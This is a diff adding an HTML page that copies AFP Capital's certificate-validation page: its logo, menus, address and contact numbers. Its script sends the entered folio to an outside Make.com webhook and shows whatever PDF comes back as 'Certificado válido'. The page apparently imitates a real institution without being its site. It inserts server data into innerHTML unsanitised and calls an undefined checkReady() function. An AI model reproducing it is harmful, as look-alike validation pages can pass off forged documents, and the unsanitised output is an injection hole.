@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Validar Certificados – AFP Capital</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Inter', sans-serif; background: #fff; color: #1a1a2e; min-height: 100vh; display: flex; flex-direction: column; }
+
+    /* ── SUPER NAV ── */
+    .super-nav { background: #fff; border-bottom: 1px solid #eee; padding: 10px 48px; display: flex; justify-content: flex-end; align-items: center; gap: 24px; font-size: 0.8rem; color: #555; }
+    .super-nav a { color: #555; text-decoration: none; display: flex; align-items: center; gap: 5px; }
+    .super-nav a:hover { color: #1a5fb4; }
+
+    /* ── MAIN NAV ── */
+    .main-nav { background: #fff; padding: 14px 48px; display: flex; align-items: center; gap: 8px; box-shadow: 0 2px 8px rgba(0,0,0,.06); }
+    .main-nav img { height: 48px; object-fit: contain; }
+    .main-nav nav { display: flex; gap: 4px; margin-left: 24px; }
+    .main-nav nav a { font-size: 0.9rem; color: #333; text-decoration: none; padding: 8px 14px; font-weight: 500; border-bottom: 3px solid transparent; }
+    .main-nav nav a.active { color: #1a5fb4; border-bottom-color: #1a5fb4; font-weight: 600; }
+    .main-nav nav a:hover { color: #1a5fb4; }
+    .main-nav .search-btn { margin-left: auto; border: 1.5px solid #ddd; border-radius: 30px; padding: 8px 18px; font-size: 0.85rem; color: #555; font-family: 'Inter', sans-serif; cursor: text; display: flex; align-items: center; gap: 6px; }
+    .main-nav .bell { margin-left: 12px; color: #888; font-size: 1.1rem; cursor: pointer; }
+    .main-nav .btn-inicia { border: 2px solid #1a5fb4; color: #1a5fb4; padding: 9px 20px; border-radius: 30px; font-size: 0.85rem; font-weight: 600; text-decoration: none; margin-left: 12px; white-space: nowrap; }
+    .main-nav .btn-contacto { background: #c8e63a; color: #1a1a2e; padding: 9px 20px; border-radius: 30px; font-size: 0.85rem; font-weight: 700; text-decoration: none; margin-left: 8px; white-space: nowrap; }
+    .main-nav .btn-contacto:hover { background: #b0d020; }
+
+    /* ── SUB NAV (Empresas menu) ── */
+    .sub-nav { background: #fff; border-bottom: 1px solid #e8e8e8; padding: 0 48px; display: flex; gap: 0; }
+    .sub-nav a { font-size: 0.85rem; color: #444; text-decoration: none; padding: 14px 20px; font-weight: 500; border-bottom: 3px solid transparent; }
+    .sub-nav a:hover { color: #1a5fb4; }
+    .sub-nav a.active { color: #1a5fb4; border-bottom-color: #1a5fb4; font-weight: 600; }
+
+    /* ── HERO SECTION with dots ── */
+    .hero-section { position: relative; padding: 64px 48px 64px; display: flex; gap: 80px; align-items: flex-start; overflow: hidden; min-height: 420px; }
+
+    /* Dot pattern background */
+    .hero-section::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background-image: radial-gradient(circle, #c8e63a 1.5px, transparent 1.5px);
+      background-size: 18px 18px;
+      opacity: 0.4;
+      pointer-events: none;
+    }
+
+    .hero-left { flex: 1; position: relative; z-index: 1; padding-top: 8px; }
+    .hero-left h1 { font-size: 2.4rem; font-weight: 700; color: #1a1a2e; line-height: 1.2; margin-bottom: 16px; }
+    .hero-left p { font-size: 0.95rem; color: #555; line-height: 1.7; max-width: 480px; }
+
+    .hero-right { width: 420px; flex-shrink: 0; position: relative; z-index: 1; }
+
+    /* ── FORM CARD ── */
+    .form-card { background: #fff; border-radius: 10px; box-shadow: 0 4px 24px rgba(0,0,0,.10); padding: 32px 28px; }
+    .form-card h2 { font-size: 1.5rem; font-weight: 700; color: #1a1a2e; margin-bottom: 16px; }
+    .form-card .sub-text { font-size: 0.85rem; color: #555; line-height: 1.6; margin-bottom: 8px; }
+    .form-card .folio-link { display: inline-block; font-size: 0.82rem; color: #1a5fb4; text-decoration: none; margin-bottom: 20px; }
+    .form-card .folio-link:hover { text-decoration: underline; }
+
+    .field-wrap { position: relative; border: 1.5px solid #c8d0dc; border-radius: 6px; margin-bottom: 16px; padding: 10px 14px 8px; transition: border-color .2s; }
+    .field-wrap:focus-within { border-color: #1a5fb4; }
+    .field-wrap label { display: block; font-size: 0.75rem; color: #888; margin-bottom: 4px; font-weight: 500; }
+    .field-wrap input { width: 100%; border: none; font-family: 'Inter', sans-serif; font-size: 0.92rem; color: #333; outline: none; background: transparent; }
+    .field-wrap input::placeholder { color: #bbb; }
+
+    .btn-validar { width: 100%; padding: 14px; background: #d0d8e4; color: #888; border: none; border-radius: 30px; font-family: 'Inter', sans-serif; font-size: 0.92rem; font-weight: 600; cursor: not-allowed; transition: all .25s; margin-top: 4px; }
+    .btn-validar.ready { background: #1a5fb4; color: #fff; cursor: pointer; }
+    .btn-validar.ready:hover { background: #134a8e; }
+
+    /* ── SPINNER / RESULT ── */
+    .spinner { display: none; text-align: center; padding: 16px 0; }
+    .spinner.active { display: block; }
+    .spinner svg { animation: spin .9s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .result-box { display: none; margin-top: 18px; border-radius: 8px; overflow: hidden; border: 1px solid #ddd; }
+    .result-box.visible { display: block; }
+    .result-header { padding: 11px 16px; font-weight: 600; font-size: 0.88rem; display: flex; align-items: center; gap: 8px; }
+    .result-header.success { background: #e8f5e9; color: #2e7d32; border-bottom: 2px solid #2e7d32; }
+    .result-header.error { background: #ffebee; color: #c62828; border-bottom: 2px solid #c62828; }
+    .result-body { padding: 16px; background: #fff; font-size: 0.88rem; }
+    .result-body .name { font-weight: 700; margin-bottom: 12px; font-size: 0.95rem; }
+    .btn-pdf { display: inline-flex; align-items: center; gap: 6px; background: #1a5fb4; color: #fff; padding: 9px 18px; border-radius: 30px; font-size: 0.85rem; font-weight: 600; cursor: pointer; border: none; font-family: 'Inter', sans-serif; transition: background .2s; }
+    .btn-pdf:hover { background: #134a8e; }
+
+    /* ── INTEREST SECTION ── */
+    .interest-section { padding: 48px 48px; background: #fff; border-top: 1px solid #eee; }
+    .interest-section h2 { font-size: 1.6rem; font-weight: 700; margin-bottom: 28px; }
+    .cards-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; }
+    .card { border-radius: 8px; overflow: hidden; }
+    .card-img { width: 100%; height: 160px; background: #e0e8f0; object-fit: cover; display: block; }
+    .card-img-placeholder { width: 100%; height: 160px; background: linear-gradient(135deg, #e0e8f0, #c8d8e8); }
+    .card-body { padding: 16px 0; }
+    .card-body h3 { font-size: 0.92rem; font-weight: 600; margin-bottom: 8px; }
+    .card-body p { font-size: 0.82rem; color: #666; line-height: 1.5; margin-bottom: 12px; }
+    .card-link { font-size: 0.82rem; color: #1a5fb4; font-weight: 600; text-decoration: none; }
+
+    /* ── CTA SECTION ── */
+    .cta-section { padding: 60px 48px; display: flex; gap: 80px; align-items: center; }
+    .cta-left { flex: 1; }
+    .cta-left h2 { font-size: 1.8rem; font-weight: 700; color: #1a5fb4; line-height: 1.3; margin-bottom: 16px; }
+    .cta-left p { font-size: 0.9rem; color: #555; line-height: 1.7; margin-bottom: 20px; }
+    .btn-cta { background: #1a5fb4; color: #fff; padding: 12px 28px; border-radius: 30px; font-size: 0.9rem; font-weight: 600; text-decoration: none; display: inline-block; }
+    .cta-right { width: 460px; height: 320px; background: linear-gradient(135deg, #e8f0fe, #d0e4ff); border-radius: 12px; display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: 1fr 1fr; gap: 8px; padding: 8px; }
+    .photo-block { background: #c8d8e8; border-radius: 8px; }
+
+    /* ── FOOTER ── */
+    footer { background: #fff; border-top: 1px solid #e0e4e8; padding: 40px 48px 20px; margin-top: auto; }
+    .footer-top { display: flex; gap: 60px; margin-bottom: 32px; }
+    .footer-brand { min-width: 220px; }
+    .footer-brand img { height: 40px; object-fit: contain; margin-bottom: 16px; display: block; }
+    .footer-brand p { font-size: 0.8rem; color: #666; line-height: 1.7; }
+    .footer-grid { flex: 1; display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px; }
+    .footer-col h4 { font-size: 0.88rem; font-weight: 600; margin-bottom: 12px; }
+    .footer-col a { display: block; font-size: 0.8rem; color: #1a5fb4; text-decoration: none; margin-bottom: 6px; }
+    .footer-col a:hover { text-decoration: underline; }
+    .footer-bottom { border-top: 1px solid #e0e4e8; padding-top: 16px; display: flex; justify-content: space-between; align-items: center; font-size: 0.75rem; color: #888; flex-wrap: wrap; gap: 10px; }
+    .footer-bottom-links a { color: #888; text-decoration: none; margin-left: 18px; }
+    .sp-badge { display: flex; align-items: center; gap: 8px; font-size: 0.75rem; }
+  </style>
+</head>
+<body>
+
+<!-- SUPER NAV -->
+<div class="super-nav">
+  <a href="#">🎯 Centro de ayuda</a>
+  <a href="#">♿ Accesibilidad ▾</a>
+  <a href="#">📍 Sucursales</a>
+  <a href="#">📞 Contáctanos</a>
+  <a href="#">🇨🇱 Chile ▾</a>
+</div>
+
+<!-- MAIN NAV -->
+<div class="main-nav">
+  <img src="https://49659256.fs1.hubspotusercontent-na1.net/hubfs/49659256/PDFS/LOGOS%20AFP/LOGO%20CAPITAL.jpg" alt="AFP Capital"/>
+  <nav>
+    <a href="#">Personas ▾</a>
+    <a href="#" class="active">Empresas ▾</a>
+    <a href="#">Capital Play ↗</a>
+  </nav>
+  <div class="search-btn">🔍 Buscar</div>
+  <span class="bell">🔔</span>
+  <a href="#" class="btn-inicia">Inicia sesión</a>
+  <a href="#" class="btn-contacto">Contáctanos</a>
+</div>
+
+<!-- SUB NAV -->
+<div class="sub-nav">
+  <a href="#">Inicio</a>
+  <a href="#">¿Por qué elegimos?</a>
+  <a href="#">Ahorro Empresa</a>
+  <a href="#">Cotizaciones</a>
+  <a href="#">Trámites y servicios</a>
+  <a href="#" class="active">Validar Certificados</a>
+</div>
+
+<!-- HERO: split layout with dots -->
+<div class="hero-section">
+  <div class="hero-left">
+    <h1>Validar certificados</h1>
+    <p>Comprueba si un certificado fue emitido por nosotros y obtén una copia para respaldar la información.</p>
+  </div>
+
+  <div class="hero-right">
+    <div class="form-card">
+      <h2>Validemos el certificado</h2>
+      <p class="sub-text">Por favor, ingresa el folio que contiene 21 caracteres compuesto por números y letras.</p>
+      <a href="#" class="folio-link">¿Dónde encuentro el folio de un certificado?</a>
+
+      <div class="field-wrap">
+        <label>Folio</label>
+        <input type="text" id="folio" placeholder="Ingresa el folio del certificado" maxlength="21" oninput="checkReady()"/>
+      </div>
+
+      <button class="btn-validar" id="btn-validar" onclick="validar()">Validar</button>
+
+      <div class="spinner" id="spinner">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
+          <circle cx="12" cy="12" r="10" stroke="#e0e0e0" stroke-width="3"/>
+          <path d="M12 2a10 10 0 0 1 10 10" stroke="#1a5fb4" stroke-width="3" stroke-linecap="round"/>
+        </svg>
+      </div>
+
+      <div class="result-box" id="result-box">
+        <div class="result-header" id="result-header"></div>
+        <div class="result-body" id="result-body"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- INTEREST SECTION -->
+<div class="interest-section">
+  <h2>Esto también te puede interesar</h2>
+  <div class="cards-grid">
+    <div class="card">
+      <div class="card-img-placeholder"></div>
+      <div class="card-body">
+        <h3>Pagos previsionales</h3>
+        <p>Te contamos todas las maneras en las que puedes realizar los pagos previsionales.</p>
+        <a href="#" class="card-link">Más información →</a>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-img-placeholder" style="background:linear-gradient(135deg,#d0e8f0,#b8d8e8)"></div>
+      <div class="card-body">
+        <h3>Consulta de afiliación</h3>
+        <p>Con esta herramienta podrás saber en qué AFP está afiliado tu trabajador y si cuenta con AFC.</p>
+        <a href="#" class="card-link">Consultar →</a>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-img-placeholder" style="background:linear-gradient(135deg,#e8f0d8,#d0e8c0)"></div>
+      <div class="card-body">
+        <h3>Reclamo previsional</h3>
+        <p>Infórmate en qué caso es correcto hacer un reclamo previsional y cuáles son sus pasos a seguir.</p>
+        <a href="#" class="card-link">Más información →</a>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-img-placeholder" style="background:linear-gradient(135deg,#f0e8d0,#e8d8b8)"></div>
+      <div class="card-body">
+        <h3>Certificados para empresas</h3>
+        <p>Te contamos a cuáles certificados puedes tener acceso como empleador y para qué sirve cada uno.</p>
+        <a href="#" class="card-link">Más información →</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- CTA SECTION -->
+<div class="cta-section">
+  <div class="cta-left">
+    <h2>Juntos por los logros de tus colaboradores</h2>
+    <p>Tu empresa es fundamental para que las metas de tus trabajadores se cumplan. Seamos socios y hagamos posible un mejor futuro financiero para tu colaborador.</p>
+    <a href="#" class="btn-cta">Trabajemos en equipo</a>
+  </div>
+  <div class="cta-right">
+    <div class="photo-block"></div>
+    <div class="photo-block" style="background:#b8cce8"></div>
+    <div class="photo-block" style="background:#c8dce8"></div>
+    <div class="photo-block" style="background:#d0e4f0"></div>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-top">
+    <div class="footer-brand">
+      <img src="https://49659256.fs1.hubspotusercontent-na1.net/hubfs/49659256/PDFS/LOGOS%20AFP/LOGO%20CAPITAL.jpg" alt="AFP Capital"/>
+      <p>Casa Matriz Apoquindo 4820, Las Condes, Santiago, RM.<br/><br/>
+      Contáctanos en Chile 600 6600 900<br/>
+      Desde el extranjero +56 2 3293 4655<br/><br/>
+      Horarios de atención Call Center<br/>
+      Lunes a jueves de 9:00 a 18:00<br/>
+      Viernes de 9:00 a 15:00</p>
+      <br/>
+      <a href="#" style="color:#1a5fb4;font-size:.8rem;text-decoration:none;">Sucursales y Centros de Servicio</a><br/>
+      <a href="#" style="color:#1a5fb4;font-size:.8rem;text-decoration:none;">Contáctanos</a>
+    </div>
+    <div class="footer-grid">
+      <div class="footer-col">
+        <h4>Compañía</h4>
+        <a href="#">¿Quiénes somos?</a>
+        <a href="#">Sala de prensa</a>
+        <a href="#">Trabaja en AFP Capital</a>
+        <a href="#">Sostenibilidad</a>
+        <a href="#">Código de ética y conducta</a>
+        <a href="#">Línea ética</a>
+        <a href="#">Accesibilidad</a>
+        <a href="#">Proveedores</a>
+      </div>
+      <div class="footer-col">
+        <h4>Información financiera</h4>
+        <a href="#">Estados financieros</a>
+        <a href="#">Información, estatutos y políticas de inversión</a>
+        <a href="#">Información para accionistas</a>
+        <a href="#">Gobierno Corporativo y principios</a>
+      </div>
+      <div class="footer-col">
+        <h4>Sitios externos</h4>
+        <a href="#">Superintendencia de pensiones</a>
+        <a href="#">Adm. de fondos de cesantías (AFC)</a>
+        <a href="#">Bolsa Nacional de Empleos</a>
+        <a href="#">Previred</a>
+        <a href="#">Asociación Gremial de AFP</a>
+        <a href="#">Beneficiarios</a>
+      </div>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <div class="sp-badge">
+      <svg width="20" height="20" viewBox="0 0 40 40" fill="none"><circle cx="20" cy="20" r="18" stroke="#1a5fb4" stroke-width="2.5"/><text x="7" y="26" fill="#1a5fb4" font-size="12" font-weight="bold">SP</text></svg>
+      <span><strong>Evalúa nuestro servicio</strong> con la Superintendencia de Pensiones</span>
+    </div>
+    <div class="footer-bottom-links">
+      <a href="#">Términos y condiciones</a>
+      <a href="#">Políticas de privacidad y seguridad</a>
+      <a href="#">Protégete del phishing</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+  const WEBHOOK = 'https://hook.us2.make.com/iq6ps3txx1jaxr91mje7sx47ynbta3kb';
+
+  async function validar() {
+    const folio = document.getElementById('folio').value.trim();
+    const uuid  = folio;
+    if (!folio) { alert('Por favor ingresa el folio del certificado.'); return; }
+    const btn = document.getElementById('btn-validar');
+    btn.disabled = true;
+    document.getElementById('spinner').classList.add('active');
+    document.getElementById('result-box').classList.remove('visible');
+
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 30000);
+
+    try {
+      const res = await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: JSON.stringify({ uuid: uuid, afp: 'Capital' }),
+        signal: controller.signal
+      });
+      clearTimeout(timeout);
+      const data = await res.json();
+      document.getElementById('spinner').classList.remove('active');
+      const box = document.getElementById('result-box');
+      const hdr = document.getElementById('result-header');
+      const bdy = document.getElementById('result-body');
+      if (data.found === true && data.pdf) {
+        hdr.className = 'result-header success';
+        hdr.innerHTML = '<svg width="16" height="16" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#2e7d32"/><path d="M8 12l3 3 5-5" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg> Certificado válido';
+        const pdfData = data.pdf.startsWith('data:') ? data.pdf : 'data:application/pdf;base64,' + data.pdf;
+        bdy.innerHTML = '<div class="name">' + (data.name || 'Certificado encontrado') + '</div>' +
+          '<div style="margin-top:12px;border:1px solid #ddd;border-radius:4px;overflow:hidden;">' +
+          '<iframe src="' + pdfData + '" style="width:100%;height:500px;border:none;" title="Certificado PDF"></iframe></div>';
+      } else if (data.found === false) {
+        hdr.className = 'result-header error';
+        hdr.innerHTML = '<svg width="16" height="16" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#c62828"/><path d="M15 9l-6 6M9 9l6 6" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg> Certificado no encontrado';
+        bdy.innerHTML = '<p style="color:#555;font-size:0.9rem;">No se encontró ningún certificado con los datos ingresados.</p>';
+      } else {
+        hdr.className = 'result-header error';
+        hdr.innerHTML = '⚠️ Respuesta inesperada del servidor.';
+        bdy.innerHTML = '<p style="color:#555;font-size:0.9rem;">Intenta nuevamente en unos minutos.</p>';
+      }
+      box.classList.add('visible');
+    } catch(err) {
+      clearTimeout(timeout);
+      document.getElementById('spinner').classList.remove('active');
+      const box = document.getElementById('result-box');
+      const hdr = document.getElementById('result-header');
+      const bdy = document.getElementById('result-body');
+      hdr.className = 'result-header error';
+      if (err.name === 'AbortError') {
+        hdr.innerHTML = '⚠️ Tiempo de espera agotado.';
+        bdy.innerHTML = '<p style="color:#555;font-size:0.9rem;">El servidor tardó demasiado. Intenta nuevamente.</p>';
+      } else {
+        hdr.innerHTML = '⚠️ No se pudo conectar con el servidor.';
+        bdy.innerHTML = '<p style="color:#555;font-size:0.9rem;">Verifica tu conexión e intenta nuevamente.</p>';
+      }
+      box.classList.add('visible');
+    } finally {
+      btn.disabled = false;
+    }
+  }
+
+  window.addEventListener('DOMContentLoaded', function() {
+    document.getElementById('folio').addEventListener('keydown', e=>{ if(e.key==='Enter') validar(); });
+  });
+</script>
+</body>
+</html>
